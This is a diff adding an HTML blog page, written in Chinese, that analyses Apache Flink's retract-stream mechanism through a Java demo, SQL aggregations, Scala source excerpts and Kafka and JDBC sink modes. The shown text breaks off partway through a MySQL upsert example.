@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Flink源码剖析：回撤流 - 编程爱好者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Flink源码剖析：回撤流" />
+<meta property="og:description" content="文章目录 1. 定义2. 示例2.1 源码分析2.1.1 聚合算子回撤2.1.2 Sink算子回撤2.1.3 聚合算子回撤 VS Sink算子回撤 1. 定义 Flink中，Kafka Source是非回撤流，Group By是回撤流。所谓回撤流，就是可以更新历史数据的流，更新历史数据并不是将发往下游的历史数据进行更改，要知道，已经发往下游的消息是追不回来的。更新历史数据的含义是，在得知某个Key（接在Key BY / Group By后的字段）对应数据已经存在的情况下，如果该Key对应的数据再次到来，会生成一条delete消息和一条新的insert消息发往下游。
+2. 示例 public class RetractDemo { public static void main(String[] args) throws Exception { // set up execution environment StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); env.setParallelism(1); // use blink planner in streaming mode EnvironmentSettings settings = EnvironmentSettings.newInstance() .inStreamingMode() .build(); StreamTableEnvironment tEnv = StreamTableEnvironment.create(env, settings); // 用fromElements模拟非回撤消息 DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; dataStream = env.fromElements(new Tuple2&lt;&gt;(&#34;hello&#34;, 1), new Tuple2&lt;&gt;(&#34;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchobby.github.io/posts/41473609d3c9f4b4a42b50d29897cb9a/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-11-23T01:15:22+08:00" />
+<meta property="article:modified_time" content="2020-11-23T01:15:22+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程爱好者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Flink源码剖析：回撤流</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-light">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p></p> 
+<div class="toc"> 
+ <h4>文章目录</h4> 
+ <ul><li><ul><li><ul><li><a href="#1__1" rel="nofollow">1. 定义</a></li><li><a href="#2__4" rel="nofollow">2. 示例</a></li><li><a href="#21__38" rel="nofollow">2.1 源码分析</a></li><li><ul><li><a href="#211__39" rel="nofollow">2.1.1 聚合算子回撤</a></li><li><a href="#212_Sink_176" rel="nofollow">2.1.2 Sink算子回撤</a></li><li><a href="#213__VS_Sink_227" rel="nofollow">2.1.3 聚合算子回撤 VS Sink算子回撤</a></li></ul> 
+   </li></ul> 
+  </li></ul> 
+ </li></ul> 
+</div> 
+<p></p> 
+<h4><a id="1__1"></a>1. 定义</h4> 
+<p>Flink中，Kafka Source是非回撤流，Group By是回撤流。所谓回撤流，就是可以更新历史数据的流，更新历史数据并不是将发往下游的历史数据进行更改，要知道，已经发往下游的消息是追不回来的。更新历史数据的含义是，在得知某个Key（接在Key BY / Group By后的字段）对应数据已经存在的情况下，如果该Key对应的数据再次到来，会生成一条delete消息和一条新的insert消息发往下游。</p> 
+<h4><a id="2__4"></a>2. 示例</h4> 
+<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RetractDemo</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{<!-- --></span>
+        <span class="token comment">// set up execution environment</span>
+        StreamExecutionEnvironment env <span class="token operator">=</span> StreamExecutionEnvironment<span class="token punctuation">.</span><span class="token function">getExecutionEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        env<span class="token punctuation">.</span><span class="token function">setParallelism</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// use blink planner in streaming mode</span>
+        EnvironmentSettings settings <span class="token operator">=</span> EnvironmentSettings<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">inStreamingMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        StreamTableEnvironment tEnv <span class="token operator">=</span> StreamTableEnvironment<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span> settings<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 用fromElements模拟非回撤消息</span>
+        DataStream<span class="token operator">&lt;</span>Tuple2<span class="token generics function"><span class="token punctuation">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token punctuation">&gt;</span></span><span class="token operator">&gt;</span> dataStream <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">fromElements</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Tuple2</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Tuple2</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Tuple2</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        tEnv<span class="token punctuation">.</span><span class="token function">registerDataStream</span><span class="token punctuation">(</span><span class="token string">"tmpTable"</span><span class="token punctuation">,</span> dataStream<span class="token punctuation">,</span> <span class="token string">"word, num"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Table table <span class="token operator">=</span> tEnv<span class="token punctuation">.</span><span class="token function">sqlQuery</span><span class="token punctuation">(</span><span class="token string">"select cnt, count(word) as freq from (select word, count(num) as cnt from tmpTable group by word) group by cnt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 启用回撤流机制</span>
+        tEnv<span class="token punctuation">.</span><span class="token function">toRetractStream</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> TypeInformation<span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeHint</span><span class="token operator">&lt;</span>Tuple2<span class="token generics function"><span class="token punctuation">&lt;</span>Long<span class="token punctuation">,</span> Long<span class="token punctuation">&gt;</span></span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        env<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<p>结果：</p> 
+<pre><code>(true,(1,1))
+(false,(1,1))
+(true,(2,1))
+(false,(2,1))
+(true,(3,1))
+</code></pre> 
+<p><img src="https://images2.imgbox.com/ac/9d/XgBjvzkF_o.png" alt="在这里插入图片描述"></p> 
+<h4><a id="21__38"></a>2.1 源码分析</h4> 
+<h5><a id="211__39"></a>2.1.1 聚合算子回撤</h5> 
+<p>有如下sql：<br> 第一层count，接收kafka source的非回撤流：</p> 
+<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> region<span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">AS</span> order_cnt <span class="token keyword">FROM</span> order_tab <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> region
+</code></pre> 
+<p><img src="https://images2.imgbox.com/05/a9/z1MZf0QM_o.png" alt="在这里插入图片描述"><br> 第二层count，接收第一层count的回撤流：</p> 
+<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> order_cnt<span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span> <span class="token keyword">as</span> region_cnt <span class="token keyword">FROM</span> order_count_view <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> order_cnt
+</code></pre> 
+<p><img src="https://images2.imgbox.com/81/1d/i4rod0ql_o.png" alt="在这里插入图片描述"><br> 下面来分析一下其源码：</p> 
+<ol><li>代码生成<br> Flink在为SQL语句生成物理执行计划是，会在<code>AggregateUtil.createGroupAggregateFunction</code>方法中生成聚合方法<code>GeneratedAggregations#retract()</code>,并最终利用Janino动态编译框架编译运行。生成<code>GeneratedAggregations</code></li></ol> 
+<pre><code class="prism language-java">object AggregateUtil <span class="token punctuation">{<!-- --></span>
+	<span class="token keyword">private</span><span class="token punctuation">[</span>flink<span class="token punctuation">]</span> def createDataStreamGroupAggregateFunction<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>generateRetraction<span class="token operator">:</span> Boolean<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment">// 动态生成聚合方法</span>
+    <span class="token keyword">new</span> <span class="token class-name">GroupTableAggProcessFunction</span><span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token punctuation">(</span>
+    genAggregations<span class="token punctuation">.</span>asInstanceOf<span class="token punctuation">[</span>GeneratedTableAggregationsFunction<span class="token punctuation">]</span><span class="token punctuation">,</span>
+    aggregationStateType<span class="token punctuation">,</span>
+    <span class="token comment">// 生成聚合函数是否支持retraction，该方法通过判断上游流是否支持回撤来进行返回，true表示支持，false表示不支持</span>
+    <span class="token comment">// 例如kafka source算子不支持回撤流，count聚合算子支持回撤流</span>
+    generateRetraction<span class="token punctuation">,</span>
+    groupings<span class="token punctuation">.</span>length<span class="token punctuation">,</span>
+    queryConfig<span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<pre><code class="prism language-java"><span class="token keyword">class</span> <span class="token class-name">GroupAggProcessFunction</span><span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">private</span> val generateRetraction<span class="token operator">:</span> Boolean<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+  <span class="token comment">// 代理模式，真正生成的function被GroupTableAggProcessFunction所代理</span>
+  <span class="token keyword">private</span> var function<span class="token operator">:</span> GeneratedTableAggregations <span class="token operator">=</span> _
+  
+	override def <span class="token function">open</span><span class="token punctuation">(</span>config<span class="token operator">:</span> Configuration<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+  	LOG<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span>s<span class="token string">"Compiling TableAggregateHelper: ${genTableAggregations.name} \n\n "</span> <span class="token operator">+</span>
+      s<span class="token string">"Code:\n${genTableAggregations.code}"</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">// 利用janino动态编译框架，动态编译并动态加载聚合函数</span>
+    val clazz <span class="token operator">=</span> <span class="token function">compile</span><span class="token punctuation">(</span>
+      <span class="token comment">// 获取类加载器</span>
+      getRuntimeContext<span class="token punctuation">.</span>getUserCodeClassLoader<span class="token punctuation">,</span>
+      genAggregations<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
+      genAggregations<span class="token punctuation">.</span>code<span class="token punctuation">)</span>
+    LOG<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Instantiating TableAggregateHelper."</span><span class="token punctuation">)</span>
+    function <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    function<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>getRuntimeContext<span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<pre><code class="prism language-java"><span class="token comment">// janino的使用</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>janino<span class="token punctuation">.</span>SimpleCompiler
+trait <span class="token class-name">Compiler</span><span class="token punctuation">[</span>T<span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
+  @<span class="token keyword">throws</span><span class="token punctuation">(</span>classOf<span class="token punctuation">[</span>CompileException<span class="token punctuation">]</span><span class="token punctuation">)</span>
+  def <span class="token function">compile</span><span class="token punctuation">(</span>cl<span class="token operator">:</span> ClassLoader<span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token punctuation">,</span> code<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token operator">:</span> Class<span class="token punctuation">[</span>T<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token function">require</span><span class="token punctuation">(</span>cl <span class="token operator">!=</span> null<span class="token punctuation">,</span> <span class="token string">"Classloader must not be null."</span><span class="token punctuation">)</span>
+    val compiler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleCompiler</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    compiler<span class="token punctuation">.</span><span class="token function">setParentClassLoader</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
+      compiler<span class="token punctuation">.</span><span class="token function">cook</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{<!-- --></span>
+      <span class="token keyword">case</span> t<span class="token operator">:</span> Throwable <span class="token operator">=</span><span class="token operator">&gt;</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidProgramException</span><span class="token punctuation">(</span><span class="token string">"Table program cannot be compiled. "</span> <span class="token operator">+</span>
+          <span class="token string">"This is a bug. Please file an issue."</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    compiler<span class="token punctuation">.</span>getClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>asInstanceOf<span class="token punctuation">[</span>Class<span class="token punctuation">[</span>T<span class="token punctuation">]</span>
+	<span class="token punctuation">}</span>  
+<span class="token punctuation">}</span>
+</code></pre> 
+<ol start="2"><li>回撤<br> 聚合算子中包含两种状态，state 存储中间结果状态（如count(id)值）、cntState存储key对应的消息数量（聚合消息+1，回撤消息-1）。state用于不断更新中间聚合状态，cntState用于判断向下游发送当前新的聚合消息，还是上一次聚合消息对应的回撤消息</li></ol> 
+<pre><code class="prism language-java">state <span class="token keyword">class</span> <span class="token class-name">GroupAggProcessFunction</span><span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
+    <span class="token keyword">extends</span> <span class="token class-name">ProcessFunctionWithCleanupState</span><span class="token punctuation">[</span>K<span class="token punctuation">,</span> CRow<span class="token punctuation">,</span> CRow<span class="token punctuation">]</span><span class="token punctuation">(</span>queryConfig<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
+      <span class="token comment">// 每一条消息都会经过该方法处理</span>
+      override def <span class="token function">processElement</span><span class="token punctuation">(</span>
+      <span class="token comment">// 消息的格式是CRow，包含一个change字段，标识是否是聚合消息；true标识聚合消息，false标识回撤消息</span>
+      inputC<span class="token operator">:</span> CRow<span class="token punctuation">,</span>
+      ctx<span class="token operator">:</span> KeyedProcessFunction<span class="token punctuation">[</span>K<span class="token punctuation">,</span> CRow<span class="token punctuation">,</span> CRow<span class="token punctuation">]</span>#Context<span class="token punctuation">,</span>
+      out<span class="token operator">:</span> Collector<span class="token punctuation">[</span>CRow<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> Unit <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        
+          <span class="token comment">// 中间状态，即上一次的聚合结果</span>
+    			var accumulators <span class="token operator">=</span> state<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+          <span class="token comment">// key对应的消息数量，对于不支持回撤流的消息，取值可以&gt;1；对于支持回撤流的消息，取值为0或1</span>
+    			var inputCnt <span class="token operator">=</span> cntState<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+          <span class="token comment">// 如果是聚合消息</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>inputC<span class="token punctuation">.</span>change<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+      			inputCnt <span class="token operator">+=</span> <span class="token number">1</span>
+      			<span class="token comment">// accumulate()是聚合方法，例如count()</span>
+      			function<span class="token punctuation">.</span><span class="token function">accumulate</span><span class="token punctuation">(</span>accumulators<span class="token punctuation">,</span> input<span class="token punctuation">)</span>
+      			function<span class="token punctuation">.</span><span class="token function">setAggregationResults</span><span class="token punctuation">(</span>accumulators<span class="token punctuation">,</span> newRow<span class="token punctuation">.</span>row<span class="token punctuation">)</span>
+    			<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token comment">// 对于支持回撤流的消息，inputCnt取值为0或1，因为某条消息如果要发生变更，只有先撤回，再新增新消息，如图片中的（+ SH 1）,（- SH 1），（+ SH 2）</span>
+      			inputCnt <span class="token operator">-=</span> <span class="token number">1</span>
+            <span class="token comment">// function对象的retract（）方法，只有在判断上游算子支持回撤流时才会生成；在当前场景下为与count()相反的逻辑，即对input中key的count聚合进行减一操作</span>
+      			function<span class="token punctuation">.</span><span class="token function">retract</span><span class="token punctuation">(</span>accumulators<span class="token punctuation">,</span> input<span class="token punctuation">)</span>
+      			function<span class="token punctuation">.</span><span class="token function">setAggregationResults</span><span class="token punctuation">(</span>accumulators<span class="token punctuation">,</span> newRow<span class="token punctuation">.</span>row<span class="token punctuation">)</span>
+    			<span class="token punctuation">}</span>
+        	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        
+          <span class="token comment">// 如果该key对应的中间状态还存在，即如果该key还存在，发送最新的聚合消息</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>inputCnt <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+            <span class="token comment">// update the state</span>
+      			state<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>accumulators<span class="token punctuation">)</span>
+      			cntState<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>inputCnt<span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+            <span class="token comment">// newRow/prevRow分别代表新消息和对上一次消息的回撤消息，具体请参考源码</span>
+          	out<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>newRow<span class="token punctuation">)</span>
+          <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
+            <span class="token comment">// 如果该key的聚合消息和回撤消息数量相等，则认为该key即将消失，发送回撤消息</span>
+            out<span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>prevRow<span class="token punctuation">)</span>
+      			<span class="token comment">// 清除状态</span>
+      			state<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      			cntState<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+          <span class="token punctuation">}</span>
+    	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+      <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<blockquote> 
+ <p>参考：<br> https://cloud.tencent.com/developer/article/1424935<br> https://zhuanlan.zhihu.com/p/101073040<br> https://developer.aliyun.com/article/667700?spm=a2c6h.13262185.0.0.513c7e18wJqFRJ</p> 
+</blockquote> 
+<h5><a id="212_Sink_176"></a>2.1.2 Sink算子回撤</h5> 
+<p>上一小节是对于聚合算子回撤流的分析，这一节讲讲sink算子的回撤。官方对于sink的插入模式有以下三种描述：</p> 
+<ul><li>Append 模式 - 该模式用户在定义Sink的DDL时候不定义PK，在Apache Flink内部生成的所有只有INSERT语句；</li><li>Upsert 模式 - 该模式用户在定义Sink的DDL时候可以定义PK，在Apache Flink内部会根据事件打标(retract机制)生成INSERT/UPDATE和DELETE 语句,其中如果定义了PK， UPDATE语句按PK进行更新，如果没有定义PK UPDATE会按整行更新；</li><li>Retract 模式 - 该模式下会产生INSERT和DELETE两种信息，Sink Connector 根据这两种信息构造对应的数据操作指令；</li></ul> 
+<p>但其实sink算子是否支持回撤流，要根据sink数据源的特性而定。例如kafka sink只支持append模式，jdbc sink在Flink1.11中只支持upsert（不配置primary key会报错）。这都跟sink数据源的特性密切相关</p> 
+<ol><li>kafka sink<br> 如kafka是利用log中顺序追加消息的方式存储消息，因此只支持append模式，网上有修改kafka sink connector以支持upsert的方法：将聚合算子中的回撤消息（false）过滤掉，只留下聚合消息（true），并写入kafka，带来的现象就是一个聚合结果会多次出现在kafka中，算是一种阉割版的upsert模式，代码如下：</li></ol> 
+<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">KafkaTableSinkBase</span> <span class="token keyword">implements</span> <span class="token class-name">AppendStreamTableSink</span><span class="token generics function"><span class="token punctuation">&lt;</span>Row<span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>
+  <span class="token comment">// 将 kafka 改成 upsert</span>
+	<span class="token annotation punctuation">@Override</span>
+	<span class="token keyword">public</span> DataStreamSink<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token function">consumeDataStream</span><span class="token punctuation">(</span>DataStream<span class="token operator">&lt;</span>Tuple2<span class="token generics function"><span class="token punctuation">&lt;</span>Boolean<span class="token punctuation">,</span> Row<span class="token punctuation">&gt;</span></span><span class="token operator">&gt;</span> dataStream<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token keyword">final</span> SinkFunction<span class="token generics function"><span class="token punctuation">&lt;</span>Row<span class="token punctuation">&gt;</span></span> kafkaProducer <span class="token operator">=</span> <span class="token function">createKafkaProducer</span><span class="token punctuation">(</span>
+            topic<span class="token punctuation">,</span>
+            properties<span class="token punctuation">,</span>
+            serializationSchema<span class="token punctuation">,</span>
+            partitioner<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 过滤掉回撤消息</span>
+    <span class="token keyword">return</span> dataStream<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>f0<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>f1<span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">addSink</span><span class="token punctuation">(</span>kafkaProducer<span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">setParallelism</span><span class="token punctuation">(</span>dataStream<span class="token punctuation">.</span><span class="token function">getParallelism</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span>TableConnectorUtils<span class="token punctuation">.</span><span class="token function">generateRuntimeName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getFieldNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<blockquote> 
+ <p>参考：<br> https://mp.weixin.qq.com/s/MSs7HSaegyWWU3Fig2PYYA<br> https://github.com/vendanner/vendanner.github.io/blob/68c5723adfca567330f38cb1d72db38c95bc5cdf/_posts/2020-08-10-Flink%20SQL%20%E4%B9%8B%20Create%20Table.md</p> 
+</blockquote> 
+<ol start="2"><li>JDBC Sink<br> jdbc sink我们以mysql为例，理论上mysql支持append、upsert、retract中的所有模式，但是Flink1.11中只提供了upsert模式。这很好理解，CDC作为Flink1.11的重大特性，append和retract对于CDC都没有意义，只有upsert符合CDC的初衷。</li></ol> 
+<blockquote> 
+ <p>注意：Flink 1.11中ddl中不配置primary key会报错，尽管Flink并不会校验primary key的正确性，而只是upsert模式的一种表征</p> 
+</blockquote> 
+<p>其原理是利用了mysql的upsert原子语句（必须有主键）来实现，如下：</p> 
+<pre><code class="prism language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token punctuation">`</span>TABLE_SINK_SYNC<span class="token punctuation">`</span><span class="token punctuation">(</span><span class="token punctuation">`</span>eno<span class="token punctuation">`</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>ename<span class="token punctuation">`</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>esex<span class="token punctuation">`</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>ebirthday<span class="token punctuation">`</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>eteam<span class="token punctuation">`</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>eincome<span class="token punctuation">`</span><span class="token punctuation">)</span>
+<span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>
+<span class="token keyword">ON</span> <span class="token keyword">DUPLICATE</span> <span class="token keyword">KEY</span> <span class="token keyword">UPDATE</span> <span class="token punctuation">`</span>eno<span class="token punctuation">`</span><span class="token operator">=</span><span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token punctuation">`</span>eno<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                        <span class="token punctuation">`</span>ename<span class="token punctuation">`</span><span class="token operator">=</span><span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token punctuation">`</span>ename<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                        <span class="token punctuation">`</span>esex<span class="token punctuation">`</span><span class="token operator">=</span><span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token punctuation">`</span>esex<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                        <span class="token punctuation">`</span>ebirthday<span class="token punctuation">`</span><span class="token operator">=</span><span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token punctuation">`</span>ebirthday<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                        <span class="token punctuation">`</span>eteam<span class="token punctuation">`</span><span class="token operator">=</span><span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token punctuation">`</span>eteam<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
